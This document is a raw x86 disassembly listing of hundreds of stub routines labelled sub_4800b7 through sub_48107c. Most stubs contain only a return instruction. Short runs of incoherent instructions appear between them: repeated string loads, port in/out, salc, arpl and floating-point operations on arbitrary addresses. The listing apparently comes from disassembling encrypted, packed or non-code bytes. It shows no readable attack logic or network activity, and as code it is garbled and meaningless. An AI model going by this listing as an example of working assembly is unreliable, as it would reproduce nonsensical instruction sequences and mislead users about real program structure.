add eax 0xaedfdede
lodsb [ esi ]
lodsb [ esi ]
mov edx 0xacac8fd0
retn
sub_4800b7
retn
sub_4800b8
retn
sub_4800b9
retn
sub_4800ba
retn
sub_4800bb
retn
sub_4800bc
retn
sub_4800bd
retn
sub_4800be
retn
sub_4800bf
retn
sub_4800c0
retn
sub_4800c1
retn
sub_480102
retn
sub_480103
retn
sub_480104
retn
sub_480105
retn
sub_480106
retn
sub_480107
retn
sub_480108
retn
sub_480109
retn
sub_48010a
retn
sub_48010b
retn
sub_48010c
retn
sub_48010d
retn
sub_48010e
retn
sub_48010f
fld [ edx + 0x5 ]
fsub [ ebx - 0x53762a46 ]
lodsb [ esi ]
xor eax 0x355d47da
salc
sbb [ esi + edx * 8 - 0xb ] 0xdacac85
nop
retn
sub_480129
retn
sub_48012a
retn
sub_48012b
retn
sub_48012c
retn
sub_48012d
retn
sub_48012e
retn
sub_48012f
retn
sub_48015b
retn
sub_48015c
push es
fdivr [ edi + 0x517fbfd2 ]
push ebx
push ebx
add [ ecx ] bh
push edi
cmp edx [ ebx + 0x63 ]
push ebx
push ebx
mov edx 0x53535993
retn
sub_480173
retn
sub_480174
retn
sub_480175
retn
sub_480176
retn
sub_480199
retn
sub_48019a
retn
sub_48019b
retn
sub_48019c
retn
sub_48019d
retn
sub_48019e
retn
sub_48019f
retn
sub_4801a0
retn
sub_4801a1
retn
sub_4801a2
retn
sub_4801a3
retn
sub_4801a4
retn
sub_4801bd
retn
sub_4801be
retn
sub_4801bf
retn
sub_4801c0
pop esp
in al 0x51
mov edx 0xacac8c11
retn
sub_4801c9
retn
sub_4801ca
retn
sub_4801cc
retn
sub_4801cd
retn
sub_4801ce
retn
sub_4801cf
retn
sub_4801d0
retn
sub_4801d1
add [ ebx ] al
mov ebx 0xacac9aec
cmp [ ebx - 0x22 ] eax
push ss
mov [ 0xffffffff8c88ba00 ] eax
lodsb [ esi ]
lodsb [ esi ]
retn
sub_4801e4
mov ebx 0xacac9afd
rcl [ edi - 0x845faa1 ] 0x1
mov ah 0xac
lodsb [ esi ]
mov edx 0xacaceef6
or al 0x9a
nop
retn
sub_4801fb
retn
sub_4801fc
retn
sub_4801fd
retn
sub_4801fe
retn
sub_4801ff
retn
sub_480200
retn
sub_480201
retn
sub_480202
retn
sub_480203
retn
sub_480204
retn
sub_480205
retn
sub_480206
retn
sub_480207
retn
sub_480208
retn
sub_480209
retn
sub_48020a
or al 0xba
test edi ebp
lodsb [ esi ]
lodsb [ esi ]
retn
sub_480211
retn
sub_480212
retn
sub_480213
retn
sub_480214
retn
sub_480215
retn
sub_480234
fcomp [ eax ]
or edi [ ebx - 0x53536c11 ]
mov edx 0xacac81bb
rcl [ edi - 0x672a45a1 ] 0x1
lodsb [ esi ]
lodsb [ esi ]
retn
sub_48024a
retn
sub_48024b
retn
sub_480279
retn
sub_48027a
retn
sub_48027b
retn
sub_48027c
retn
sub_48027d
salc
0xacbb3fba 0xc3ac
retn
sub_480286
retn
sub_480287
retn
sub_480288
rcl [ ebp + 0x6dd03551 ] 0x1
push ebx
pop esp
salc
mov ebx 0x78acacbd
mov eax [ 0x3559e45c ]
ficomp [ edi + 0x45 ]
mov edx 0x5353426d
retn
sub_4802b0
lodsb [ esi ]
lodsb [ esi ]
mov edx 0xacac9bcd
retn
sub_4802b8
retn
sub_4802b9
retn
sub_4802ba
retn
sub_4802bb
retn
sub_4802bc
retn
sub_4802bd
retn
sub_4802be
retn
sub_4802bf
retn
sub_4802c0
retn
sub_4802c1
retn
sub_4802c2
retn
sub_4802c3
retn
sub_4802c4
retn
sub_4802e8
retn
sub_4802e9
retn
sub_4802ea
add al 0x3
mov edx 0xacac89ed
retn
sub_4802f2
retn
sub_4802f3
retn
sub_4802f4
retn
sub_4802f5
retn
sub_4802f6
retn
sub_4802f7
retn
sub_4802f8
push es
mov edx 0xacac9110
retn
sub_4802ff
retn
sub_480300
retn
sub_480301
retn
sub_480302
retn
sub_480303
retn
sub_480304
retn
sub_480305
retn
sub_480306
retn
sub_480307
retn
sub_480308
retn
sub_480309
retn
sub_48030a
retn
sub_48030b
retn
sub_48030c
retn
sub_48030d
retn
sub_48030e
retn
sub_48030f
retn
sub_480310
retn
sub_480311
retn
sub_480312
retn
sub_480313
retn
sub_480314
retn
sub_480315
retn
sub_480316
retn
sub_480317
retn
sub_480318
retn
sub_480319
retn
sub_48031a
lodsb [ esi ]
pop edi
lodsb [ esi ]
retn
sub_48031f
push ebx
push ebx
push ebx
mov edx 0xacacb0d1
retn
sub_480329
retn
sub_48032a
retn
sub_48032b
retn
sub_48032c
retn
sub_48032d
add al 0xbb
test [ edx - 0x54275354 ] dl
salc
lodsb [ esi ]
mov edx 0xacacbf1c
retn
sub_48033d
retn
sub_48033e
retn
sub_48033f
retn
sub_480340
retn
sub_480341
retn
sub_480342
retn
sub_480343
retn
sub_480344
retn
sub_480345
retn
sub_480346
retn
sub_480347
cmp [ ecx ] esp
xor eax 0xbb916da
cmp [ edx ] edi
xor eax 0xbbf16da
cmp [ 0xffffffffbd16da35 ] esp
or edi [ edx - 0x53535663 ]
retn
sub_480362
retn
sub_480363
retn
sub_480364
retn
sub_480365
retn
sub_480366
retn
sub_480367
retn
sub_480368
retn
sub_480369
retn
sub_48036a
retn
sub_48036b
retn
sub_48036c
retn
sub_48036d
retn
sub_48036e
retn
sub_48036f
retn
sub_480370
retn
sub_480371
retn
sub_480372
retn
sub_480373
retn
sub_480374
retn
sub_480375
retn
sub_480376
retn
sub_480377
retn
sub_480378
retn
sub_480379
retn
sub_48037a
retn
sub_48037b
retn
sub_48037c
retn
sub_48037d
retn
sub_48037e
retn
sub_48037f
retn
sub_480380
retn
sub_480381
retn
sub_480383
retn
sub_480384
retn
sub_480385
retn
sub_480386
retn
sub_480387
retn
sub_480388
retn
sub_480389
retn
sub_48038a
retn
sub_48038b
retn
sub_4803b0
retn
sub_4803b1
retn
sub_4803b2
retn
sub_4803b3
fcomp st7
ja r-xdata
retn
push ebx
push ebx
push ebx
add al 0x3
mov edx 0xacaca159
retn
sub_4803c2
retn
sub_4803c3
retn
sub_4803c4
retn
sub_4803c5
retn
sub_4803c6
retn
sub_4803c7
retn
sub_4803e0
retn
sub_4803e1
retn
sub_4803e2
retn
sub_4803e3
retn
sub_4803e4
retn
sub_4803e7
rcl [ ebx + 0x53 ] cl
push ebx
add edx [ ebx + edx * 2 + 0x53525354 ]
mov edx 0xacac927c
retn
sub_4803f8
retn
sub_480443
retn
sub_480444
retn
sub_480445
retn
sub_480446
retn
sub_480447
retn
sub_480448
retn
sub_480449
retn
sub_48044a
retn
sub_48044b
retn
sub_48044c
retn
sub_48044d
add al [ ebx ]
lodsb [ esi ]
dec ebx
ficom [ esi ]
scasd [ edi ]
add ebp [ esi - 0x43f345b9 ]
lodsb [ esi ]
lodsb [ esi ]
retn
sub_48045f
retn
sub_480460
retn
sub_480461
retn
sub_480462
retn
sub_480463
retn
sub_480464
retn
sub_480465
retn
sub_480466
retn
sub_480496
retn
sub_480497
retn
sub_480498
retn
sub_480499
retn
sub_48049a
retn
sub_48049b
retn
sub_48049c
retn
sub_48049d
retn
sub_48049e
push es
fdivr [ edi + 0x394fbfd0 ]
aaa
or edi [ ecx ]
and al 0x35
ficom [ esi ]
mov bh 0xb
cmp [ esi ] esi
xor eax 0xbab516da
and esi [ esi - 0x3c3c5354 ]
retn
sub_4804bc
retn
sub_4804bd
retn
sub_4804be
retn
sub_4804bf
retn
sub_4804c0
retn
sub_4804c1
retn
sub_4804c2
retn
sub_4804c3
retn
sub_4804c4
retn
sub_4804c5
retn
sub_4804c6
retn
sub_4804c7
retn
sub_4804c8
retn
sub_4804c9
retn
sub_4804ca
retn
sub_4804cb
fcom [ ecx + 0x78 ]
push edx
nop
retn
sub_4804d1
retn
sub_4804d2
retn
sub_4804d3
retn
sub_4804d4
retn
sub_4804d5
retn
sub_4804d6
retn
sub_4804d7
retn
sub_4804d8
retn
sub_480500
retn
sub_480501
retn
sub_480502
ficomp [ esi ]
scasd [ edi ]
mov edx 0xacacac10
retn
sub_48050b
fcom st6
mov ebp [ esi + 0x1668acac ]
pop ebx
pop esp
xlat
cmp [ edx + 0x50baacac ] al
pop ebx
push ebx
push ebx
retn
sub_480520
retn
sub_480521
retn
sub_480522
retn
sub_480523
sar [ edi + 0x535351db ] cl
0x5353091e 0x48ba
sub_480530
xchg edi eax
lodsb [ esi ]
lodsb [ esi ]
retn
sub_480534
retn
sub_480535
retn
sub_480536
retn
sub_480537
retn
sub_480538
retn
sub_480539
retn
sub_48054a
mov edx 0x5353556f
ficom [ esi ]
scasd [ edi ]
add eax [ esp + ebp * 4 ]
pop edi
add [ ebp + eax + 0x5ac0067 ] ch
outsd
mov edx 0xacaca00c
retn
sub_480565
retn
sub_480566
retn
sub_480567
retn
sub_480568
retn
sub_480569
retn
sub_48056a
xchg esp eax
push ss
scasd [ edi ]
push ebx
push ebx
push ebx
push ebx
mov edx 0xacaca708
retn
sub_48059e
retn
sub_48059f
retn
sub_4805a0
retn
sub_4805a1
retn
sub_4805a2
retn
sub_4805a3
retn
sub_4805a4
retn
sub_4805a5
retn
sub_4805a6
pop esp
salc
xor [ ebx + edx * 2 + 0x53 ] dl
mov edx 0xacaca767
fisttp [ edi ]
inc esi
hlt
sub_480666
push ebx
push ebx
mov edx 0xacacecda
retn
sub_48066e
retn
sub_48066f
retn
sub_480670
retn
sub_480671
retn
sub_480672
retn
sub_480673
retn
sub_480674
retn
sub_480675
fcom [ esi ]
pop ebx
0xc3c3c390 0xc3c3
retn
sub_480680
retn
sub_480681
pop esp
xlat
push edi
mov [ 0xffffffffc1bbacac ] al
mov [ 0xffffffff93d6acac ] al
mov edx 0xacacb616
retn
sub_480694
retn
sub_480695
retn
sub_480696
retn
sub_480697
retn
sub_480698
retn
sub_480699
retn
sub_48069a
retn
sub_48069b
retn
sub_48069c
retn
sub_48069d
retn
sub_48069e
retn
sub_48069f
retn
sub_4806a0
retn
sub_4806a1
retn
sub_4806a2
rcl [ esi ] 0x1
stosd [ edi ]
jpo r-xdata
add al 0xac
add al 0x97
lodsb [ esi ]
lodsb [ esi ]
retn
sub_4806ac
retn
sub_4806ad
ficom [ esi ]
inc ebx
mov edx 0xacac8f61
retn
sub_4806b6
pop esp
xlat
mov [ 0xffffffffbaacac8d ] eax
mov bl 0xa7
lodsb [ esi ]
lodsb [ esi ]
xor eax 0xd8750eda
mov edi [ edx + 0x53535957 ]
retn
sub_4806cd
retn
sub_4806ce
retn
sub_4806cf
retn
sub_4806d0
retn
sub_4806d1
retn
sub_4806d2
retn
sub_4806d3
retn
sub_4806d4
retn
sub_4806d5
or [ edx - 0x3c3c3c70 ] bl
retn
sub_4806dc
retn
sub_4806dd
retn
sub_4806de
retn
sub_4806df
retn
sub_4806e0
retn
sub_4806e1
retn
sub_4806e2
retn
sub_4806e3
retn
sub_4806e4
retn
sub_4806e5
retn
sub_4806e6
retn
sub_4806e7
retn
sub_4806e8
retn
sub_4806e9
retn
sub_4806ea
retn
sub_4806eb
retn
sub_4806ec
retn
sub_4806ed
retn
sub_4806ee
retn
sub_4806ef
retn
sub_4806f0
retn
sub_4806f1
fsubr [ ebx - 0x51402922 ]
lodsb [ esi ]
lodsb [ esi ]
imul ecx [ esi ] 0x43
mov edx 0xacaca61c
retn
sub_480702
retn
sub_480703
retn
sub_480707
scasb [ edi ]
lodsb [ esi ]
lodsb [ esi ]
mov edx 0xacac8cb0
retn
sub_480710
retn
sub_480711
retn
sub_480712
retn
sub_480713
retn
sub_480714
retn
sub_48073a
retn
sub_48073b
retn
sub_48073c
retn
sub_48073d
add [ ebp + eax * 8 + 0x535353ff ] ch
mov ebx 0xacac9dae
shr [ ebx - 0x1028a3ae ] 0x1
out 0xac al
lodsb [ esi ]
mov edx 0xacac9a4c
retn
sub_480758
retn
sub_480759
retn
sub_48075a
retn
sub_48075b
retn
sub_48075c
retn
sub_48078b
retn
sub_48078c
retn
sub_48078d
xor eax 0xbac906da
mov [ eax + 0x53 ] dl
push ebx
retn
sub_480797
retn
sub_480798
retn
sub_480799
retn
sub_48079a
retn
sub_48079b
retn
sub_48079c
retn
sub_48079d
retn
sub_48079e
retn
sub_48079f
retn
sub_4807a0
retn
sub_4807a1
retn
sub_4807a2
retn
sub_4807a3
retn
sub_4807a4
retn
sub_4807a5
retn
sub_4807a6
retn
sub_4807a7
retn
sub_4807c4
mov esp 0xc3c3acac
pop esp
salc
sahf
out 0xac al
lodsb [ esi ]
mov edx 0xacacb25f
retn
sub_4807d5
retn
sub_4807de
or al 0x39
sub ecx [ ecx ]
cmp [ edx + edi * 4 ] edx
imul [ esp + ebp * 4 + 0x6835c3ac ]
adc eax 0x992cba55
lodsb [ esi ]
lodsb [ esi ]
retn
sub_4807f4
retn
sub_4807f5
retn
sub_4807f6
retn
sub_4807f7
retn
sub_4807f8
salc
xchg ebx eax
pop esp
xlat
test [ esp + ebp * 4 - 0x10458ec7 ] bp
mov gs [ esp + ebp * 4 - 0x3c3c3c3d ]
retn
sub_48080c
retn
sub_48080d
retn
sub_48080e
lodsb [ esi ]
pop edi
lodsb [ esi ]
retn
sub_480813
iretd
sub_480814
push ebx
push ebx
push ebx
pushad
0xfcba93d6 0xacb7
lodsb [ esi ]
retn
sub_480821
mov edx 0xacacb873
retn
sub_480827
retn
sub_480828
push es
mov edx 0xacac8124
retn
sub_48082f
pop esp
xlat
cmp [ ebp + 0x26acacac ] ecx
mov bh 0xd8
xchg esp eax
mov ebx 0xacaca768
mov edx 0xacac8d09
retn
sub_480845
retn
sub_480846
retn
sub_480847
retn
sub_480848
retn
sub_480849
retn
sub_48084a
retn
sub_48084b
retn
sub_48084c
retn
sub_48084d
retn
sub_48084e
retn
sub_48084f
retn
sub_480850
retn
sub_480851
retn
sub_480852
retn
sub_480853
retn
sub_480854
salc
xchg ebx eax
mov edx 0xacaca1b5
retn
sub_48085c
retn
sub_48085d
retn
sub_48085e
retn
sub_48085f
retn
sub_480860
retn
sub_480861
retn
sub_480862
retn
sub_480863
retn
sub_480864
retn
sub_480865
retn
sub_480866
retn
sub_480867
retn
sub_480868
retn
sub_480869
retn
sub_48086a
retn
sub_48086b
retn
sub_48086c
retn
sub_48086d
retn
sub_48086e
retn
sub_48086f
retn
sub_480870
retn
sub_480871
retn
sub_480872
retn
sub_480873
retn
sub_480874
retn
sub_480875
retn
sub_480876
retn
sub_480877
retn
sub_4808bf
retn
sub_4808c0
retn
sub_4808c1
retn
sub_4808c2
retn
sub_4808c3
retn
sub_4808c4
retn
sub_4808c5
retn
sub_4808c6
retn
sub_4808c7
retn
sub_4808c8
retn
sub_4808c9
retn
sub_4808ca
retn
sub_4808cb
retn
sub_4808cc
retn
sub_4808cd
retn
sub_4808ce
retn
sub_4808cf
retn
sub_4808d0
retn
sub_4808d1
retn
sub_4808d2
retn
sub_4808d3
retn
sub_4808d6
xchg edx eax
fsub [ edx - 0x6a277f54 ]
mov edx 0xacacb539
retn
sub_4808e3
retn
sub_4808e4
retn
sub_4808fe
xchg ecx eax
lodsb [ esi ]
lodsb [ esi ]
retn
sub_480902
retn
sub_480903
retn
sub_480904
retn
sub_480905
retn
sub_480906
retn
sub_480907
retn
sub_480908
pop esp
salc
popad
sahf
lodsb [ esi ]
lodsb [ esi ]
mov edx 0xacacfc9e
retn
sub_480914
fcom [ edi ]
ja r-xdata
push ebx
push ebx
push ebx
mov edx 0xacaca903
retn
lodsb [ esi ]
arpl [ edx - 0x53537683 ] di
retn
sub_480920
retn
sub_480921
retn
sub_480922
shr [ ebx - 0x10a64554 ] 0x1
lodsb [ esi ]
lodsb [ esi ]
retn
sub_48092b
retn
sub_48092c
retn
sub_48092d
retn
sub_48092e
pop esp
shl eax 0x1
test [ esp + ebp * 4 - 0x3c6ff2f4 ] ch
retn
sub_480939
retn
sub_48093a
retn
sub_48093b
retn
sub_48093c
retn
sub_48093d
retn
sub_48093e
retn
sub_48093f
ficomp [ ebx ]
push ecx
cmp [ ebx - 0x69e545aa ] dl
lodsb [ esi ]
lodsb [ esi ]
retn
sub_48094b
retn
sub_48094c
retn
sub_48094d
retn
sub_48094e
retn
sub_48094f
retn
sub_480950
ficom [ edx + edx * 2 ]
add ebx [ ebp + 0x54 ]
add edx edx
xchg esp eax
cdq
push ebx
push ebx
push ebx
mov edx 0xacaca903
retn
sub_480964
lodsb [ esi ]
and [ ebx ] dl
lodsb [ esi ]
add eax 0x14ac605b
mov edx 0xacace1fe
retn
sub_480973
retn
sub_480974
retn
sub_480975
retn
sub_480976
retn
sub_480977
xor eax 0xb8d16da
cmp [ ebp + 0x35 ] edi
ficom [ esi ]
mov bl 0xb
cmp [ ecx ] esi
xor eax 0xbb116da
cmp [ edx ] esi
mov edx 0xacac8035
retn
sub_480992
retn
sub_480993
retn
sub_480994
fsubr [ esi ]
inc ebx
mov edx 0xacaca8e0
retn
sub_4809e9
retn
sub_4809ea
retn
sub_480a02
retn
sub_480a04
retn
sub_480a05
retn
sub_480a06
retn
sub_480a07
retn
sub_480a08
retn
sub_480a09
retn
sub_480a0a
retn
sub_480a0b
retn
sub_480a0c
retn
sub_480a1f
retn
sub_480a20
retn
sub_480a21
retn
sub_480a22
retn
sub_480a23
pop esp
xlat
sub cl [ eax - 0x67455354 ]
sub [ esp + ebp * 4 + 0x6da35c3 ] 0xf1
or [ 0xffffffffbaf51eda ] esi
in eax 0xe7
lodsb [ esi ]
lodsb [ esi ]
retn
sub_480a3e
retn
sub_480a3f
retn
sub_480a40
retn
sub_480a41
retn
sub_480a42
retn
sub_480a44
retn
sub_480a45
retn
sub_480a46
retn
sub_480a50
rcl [ edi - 0x457427bd ] 0x1
dec edi
cmpsb [ esi ] [ edi ]
lodsb [ esi ]
lodsb [ esi ]
retn
sub_480a5b
retn
sub_480a5c
retn
sub_480a5d
retn
sub_480a5e
retn
sub_480a5f
retn
sub_480a60
retn
sub_480a61
add [ edx - 0x535344e3 ] bh
retn
sub_480a68
retn
sub_480a69
retn
sub_480a6a
retn
sub_480a6b
retn
sub_480a6d
retn
sub_480a6e
retn
sub_480a6f
retn
sub_480a70
retn
sub_480a71
retn
sub_480a72
retn
sub_480a73
retn
sub_480a74
retn
sub_480a75
retn
sub_480a97
xor eax 0xd8e30eda
mov edi [ edx - 0x53534689 ]
retn
sub_480aa3
retn
sub_480aa4
retn
sub_480aa5
retn
sub_480aa6
retn
sub_480aa7
retn
sub_480aa8
retn
sub_480aa9
retn
sub_480aaa
rcl [ edx + 0x6ad03551 ] 0x1
jae r-xdata
retn
mov [ 0xffffffffc3acaca1 ] al
retn
sub_480ab8
retn
sub_480ae0
pop esp
salc
cmp ah dl
lodsb [ esi ]
lodsb [ esi ]
mov edx 0xacace232
retn
sub_480aec
retn
sub_480aed
fist [ edi + 0x6a ]
mov edx 0xacac847d
retn
sub_480af6
retn
sub_480af7
retn
sub_480af8
retn
sub_480af9
retn
sub_480afa
retn
sub_480afb
retn
sub_480afc
add ebp [ esp + eax * 8 + 0x535353bf ]
mov edx 0xacac8920
retn
sub_480b09
retn
sub_480b0a
retn
sub_480b0b
retn
sub_480b0c
retn
sub_480b0d
retn
sub_480b0e
retn
sub_480b0f
pushad
xchg ebx eax
adc edi [ edx + 0x5353504f ]
retn
sub_480b18
retn
sub_480b19
retn
sub_480b1a
retn
sub_480b1b
retn
sub_480b1c
retn
sub_480b1d
retn
sub_480b1e
retn
sub_480b1f
retn
sub_480b20
retn
sub_480b21
retn
sub_480b22
retn
sub_480b23
pop esp
salc
sub eax ebp
lodsb [ esi ]
lodsb [ esi ]
xor eax 0xba5369d0
xchg edx eax
push ebp
push ebx
push ebx
retn
sub_480b33
retn
sub_480b4c
retn
sub_480b4d
retn
sub_480b4e
retn
sub_480b65
retn
sub_480b66
retn
sub_480b67
mov edx 0xacace862
retn
sub_480b6d
retn
sub_480b6e
retn
sub_480b6f
retn
sub_480b70
retn
sub_480bdf
retn
sub_480be0
retn
sub_480be1
retn
sub_480be2
mov ebx 0xacac8058
mov edx 0xacace5f4
retn
sub_480bed
fcom [ esi ]
pop ebx
push cs
nop
retn
sub_480bf3
retn
sub_480bf4
retn
sub_480bf5
retn
sub_480bf6
retn
sub_480bf7
retn
sub_480bf8
retn
sub_480c29
retn
sub_480c2a
retn
sub_480c2b
retn
sub_480c2c
retn
sub_480c2d
retn
sub_480c2e
retn
sub_480c2f
retn
sub_480c30
retn
sub_480c31
retn
sub_480c32
mov edx 0xacac9d28
retn
sub_480c38
retn
sub_480c39
retn
sub_480c3a
retn
sub_480c3b
retn
sub_480c77
retn
sub_480c78
retn
sub_480c79
retn
sub_480c7a
retn
sub_480c7b
retn
sub_480c7c
retn
sub_480c7d
retn
sub_480c7e
retn
sub_480c7f
pop esp
salc
cmp [ esp + ebp * 4 - 0x50f19554 ] eax
mov edx 0xacac9ba9
retn
sub_480c8e
retn
sub_480c8f
retn
sub_480ca2
retn
sub_480ca3
push es
fdivr [ edi + 0x33bfd0 ]
add eax 0xacbacdba
lodsb [ esi ]
retn
sub_480cb1
retn
sub_480cb2
retn
sub_480cb3
retn
sub_480cb4
retn
sub_480cb5
retn
sub_480cca
retn
sub_480ccb
retn
sub_480ccc
retn
sub_480ccd
retn
sub_480cce
retn
sub_480ccf
retn
sub_480cd0
retn
sub_480cd1
retn
sub_480cd2
cmp [ ebx + 0x5 ] edx
mov ebx 0xacacedee
rcl [ edi + 0x6f286a5f ] 0x1
pop esp
salc
int3
sub_480da6
pop esp
xlat
xchg edi eax
mov bl 0xac
lodsb [ esi ]
lodsb [ esi ]
in al 0x8f
push ebx
push ebx
push ebx
mov edx 0xacacaaf5
retn
sub_480db8
retn
sub_480db9
retn
sub_480dba
retn
sub_480dbb
retn
sub_480dbc
retn
sub_480dbd
retn
sub_480dbe
retn
sub_480dbf
rcl [ ecx - 0x6c29caaf ] 0x1
pop esp
xlat
xchg ebx eax
xchg ebp eax
lodsb [ esi ]
lodsb [ esi ]
mov edx 0xacaca0a3
retn
sub_480dd1
retn
sub_480de9
retn
sub_480dea
retn
sub_480deb
retn
sub_480dec
retn
sub_480ded
retn
sub_480dee
retn
sub_480def
retn
sub_480df0
retn
sub_480df1
retn
sub_480df2
retn
sub_480df3
retn
sub_480df4
retn
sub_480df5
retn
sub_480df6
retn
sub_480df7
retn
sub_480df8
retn
sub_480df9
retn
sub_480dfa
retn
sub_480dfb
retn
sub_480dfc
retn
sub_480dfd
retn
sub_480dfe
retn
sub_480dff
retn
sub_480e00
retn
sub_480e01
retn
sub_480e02
retn
sub_480e03
retn
sub_480e04
retn
sub_480e05
retn
sub_480e06
retn
sub_480e07
retn
sub_480e1b
retn
sub_480e1c
retn
sub_480e1d
retn
sub_480e1e
retn
sub_480e1f
retn
sub_480e20
retn
sub_480e21
retn
sub_480e23
retn
sub_480e24
retn
sub_480e25
retn
sub_480e26
retn
sub_480e27
retn
sub_480e28
retn
sub_480e29
retn
sub_480e2a
retn
sub_480e2b
retn
sub_480e2c
retn
sub_480e2d
retn
sub_480e2e
retn
sub_480e2f
retn
sub_480e30
pushad
xchg ebx eax
or eax 0xac8554ba
lodsb [ esi ]
retn
sub_480e39
retn
sub_480e3a
retn
sub_480e3b
retn
sub_480e3c
retn
sub_480e3d
retn
sub_480e3e
retn
sub_480e3f
retn
sub_480e40
retn
sub_480e41
mov edx 0xacac82ee
retn
sub_480e47
retn
sub_480e48
retn
sub_480e49
retn
sub_480e4a
retn
sub_480e4b
retn
sub_480e4c
retn
sub_480e4d
retn
sub_480e4e
retn
sub_480e4f
retn
sub_480e50
retn
sub_480e51
retn
sub_480e52
retn
sub_480e53
retn
sub_480e54
or dl dh
xchg ebx eax
pop esp
salc
mov edx [ ebx + 0x53 ]
push ebx
ficom [ esi ]
mov edi 0xac901fba
lodsb [ esi ]
mov edx 0xacac82f1
retn
sub_480e6b
retn
sub_480e6c
retn
sub_480e6d
retn
sub_480e6e
retn
sub_480e6f
retn
sub_480e70
retn
sub_480e71
add ebx edx
push ss
stosd [ edi ]
mov edx 0xacacbfb1
retn
sub_480e7b
mov ebx 0xacaceac2
mov edx 0x53535298
retn
sub_480e86
salc
xchg ebx eax
mov edx 0xacac9b32
retn
sub_480e8e
retn
sub_480e8f
retn
sub_480e90
retn
sub_480e91
retn
sub_480e92
retn
sub_480e93
retn
sub_480e94
retn
sub_480e95
retn
sub_480e96
retn
sub_480e97
retn
sub_480e98
retn
sub_480e99
retn
sub_480e9a
retn
sub_480e9b
retn
sub_480e9c
retn
sub_480e9d
retn
sub_480e9e
retn
sub_480e9f
retn
sub_480ea0
retn
sub_480ea1
retn
sub_480ea2
add [ ebp + eax - 0x58e925ed ] ch
push 0xd1d75c94
xchg ecx eax
lodsb [ esi ]
lodsb [ esi ]
cmp [ edi + 0x3b ] edx
push ebx
arpl [ ebx + 0x53 ] dx
add edi [ edx - 0x53534396 ]
retn
sub_480ebf
retn
sub_480ec0
retn
sub_480ec1
retn
sub_480ec2
retn
sub_480ec3
retn
sub_480ec4
retn
sub_480ec5
retn
sub_480ec6
retn
sub_480ec7
retn
sub_480ec8
retn
sub_480ec9
retn
sub_480eca
retn
sub_480ecb
retn
sub_480ecc
retn
sub_480ecd
retn
sub_480ece
retn
sub_480ecf
retn
sub_480ed0
retn
sub_480ed1
retn
sub_480ed2
retn
sub_480ed3
retn
sub_480ed4
retn
sub_480ed5
retn
sub_480ed6
or al 0xd8
xchg ebp eax
or eax 0xc3c3c390
retn
sub_480edf
retn
sub_480ee0
retn
sub_480ee1
retn
sub_480ee2
cmp edi [ esi + 0x5c530a8 ]
mov ebx 0xacace4b4
cmp edi [ eax ]
pop ecx
adc [ ecx ] edx
add eax 0x89bbabd8
in al 0xac
lodsb [ esi ]
mov edx 0xacaca802
retn
sub_480f00
fadd [ ebx - 0x16f925cb ]
or [ ecx ] edi
aaa
mov edx 0xacac8f37
retn
sub_480f0f
retn
sub_480f10
mov ebx 0xacacbdfe
or bh [ edx - 0x53530180 ]
pop esp
xlat
rol [ ebp + 0x25acacac ] cl
pop es
fcom [ esi ]
pop ebx
mov edx 0xacacbcac
retn
sub_480f2d
retn
sub_480f2e
retn
sub_480f2f
pop esp
xlat
push eax
push ebx
push ebx
push ebx
pushad
xchg ebx eax
adc ecx [ ecx - 0x6fc845f8 ]
lodsb [ esi ]
lodsb [ esi ]
retn
sub_480f41
retn
sub_480f42
retn
sub_480f43
retn
sub_480f44
retn
sub_480f45
retn
sub_480f46
retn
sub_480f47
retn
sub_480f48
retn
sub_480f49
retn
sub_480f4a
pop esp
salc
outsd
mov ebp 0xfcbaacac
push ecx
push ebx
push ebx
retn
sub_480f56
retn
sub_480f57
retn
sub_480f58
retn
sub_480f59
retn
sub_480f5a
retn
sub_480f5b
retn
sub_480f5c
retn
sub_480f5d
salc
0xaca44eba 0xc3ac
mov edx 0xacac9b54
retn
sub_480f6b
retn
sub_480f6c
retn
sub_480f6d
retn
sub_480f6e
retn
sub_480f6f
add al 0xda
or eax 0xe40fbb1b
lodsb [ esi ]
lodsb [ esi ]
ficom [ 0xfffffffff5f13b67 ]
xor bh [ eax - 0x53010d46 ]
lodsb [ esi ]
retn
sub_480f86
retn
sub_480f87
retn
sub_480f88
mov edx 0xacac965a
retn
sub_480f8e
retn
sub_480f8f
pushad
xchg ebx eax
mov edx 0xacacfae2
retn
sub_480f97
retn
sub_480f98
retn
sub_480f99
retn
sub_480f9a
retn
sub_480f9b
retn
sub_480f9c
retn
sub_480fdc
retn
sub_480fdd
retn
sub_480fde
retn
sub_480fdf
retn
sub_480fe0
pop esp
in al 0x42
rcl [ edx - 0x649c45af ] 0x1
lodsb [ esi ]
lodsb [ esi ]
retn
sub_480fec
retn
sub_480fed
retn
sub_480fee
retn
sub_480fef
retn
sub_480ff0
retn
sub_480ff1
retn
sub_480ff2
retn
sub_480ff3
retn
sub_480ff4
retn
sub_480ff5
retn
sub_480ff6
retn
sub_480ff7
retn
sub_480ff8
retn
sub_480ff9
retn
sub_480ffa
fcomp st6
fwait
scasb [ edi ]
lodsb [ esi ]
lodsb [ esi ]
add edi [ edx - 0x5353472f ]
retn
sub_481007
retn
sub_481008
retn
sub_481009
retn
sub_48100a
retn
sub_48100b
fdivr [ edi + 0x16d80202 ]
pop ebx
mov edx 0x535352ca
retn
sub_481018
retn
sub_481019
mov edx 0xacac95af
retn
sub_48101f
retn
sub_481020
retn
sub_481021
retn
sub_481022
retn
sub_481023
push es
fdivr [ edi + 0xbbfd0 ]
pushad
xchg ebx eax
add eax 0xaf16da04
ficom [ esi ]
stosd [ edi ]
ficom [ esi ]
cmpsd [ esi ] [ edi ]
jmp r-xdata
retn
sub_481039
push ebx
push ebx
adc ebx [ ecx + esi * 8 - 0x26 ]
push cs
scasd [ edi ]
ficomp [ esi ]
stosd [ edi ]
fiadd [ esi ]
cmpsd [ esi ] [ edi ]
mov edx 0xacac8963
retn
sub_48104d
retn
sub_48104e
retn
sub_48104f
retn
sub_481050
rcl [ edi - 0x73d245a1 ] 0x1
lodsb [ esi ]
lodsb [ esi ]
retn
sub_481059
retn
sub_48105a
retn
sub_48105b
retn
sub_48105c
retn
sub_48105d
retn
sub_48105e
retn
sub_48105f
retn
sub_481060
retn
sub_481061
retn
sub_481062
retn
sub_481063
retn
sub_481064
retn
sub_481065
retn
sub_481066
retn
sub_481067
retn
sub_481068
retn
sub_481069
retn
sub_48106a
retn
sub_48106b
retn
sub_48106c
retn
sub_48106d
retn
sub_48106e
retn
sub_48106f
retn
sub_481070
retn
sub_481071
retn
sub_481072
retn
sub_481073
retn
sub_481074
retn
sub_481075
retn
sub_481076
retn
sub_481077
retn
sub_481078
retn
sub_481079
retn
sub_48107a
retn
sub_48107b
retn
sub_48107c
retn
